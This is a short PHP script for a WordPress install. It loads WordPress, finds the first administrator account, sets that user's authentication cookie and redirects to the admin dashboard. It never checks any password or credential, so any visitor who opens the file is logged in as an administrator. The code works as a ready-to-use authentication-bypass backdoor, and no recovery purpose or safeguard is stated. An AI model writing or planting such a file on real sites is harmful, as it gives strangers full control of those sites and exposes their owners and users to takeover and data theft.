<?php
// Include the WordPress configuration file to access database and WordPress functions
require_once('wp-config.php');
require_once('wp-load.php');
require_once('wp-includes/pluggable.php');

// Get the administrator user by their role
$admin_user = get_users(array(
    'role'    => 'administrator',
    'number'  => 1,
))[0];

// Log the admin user in
if($admin_user) {
    // Set the current user to the admin
    wp_set_current_user($admin_user->ID);
    wp_set_auth_cookie($admin_user->ID);

    // Redirect to the WordPress admin dashboard
    wp_redirect(admin_url());
    exit;
} else {
    echo "Administrator user not found.";
}
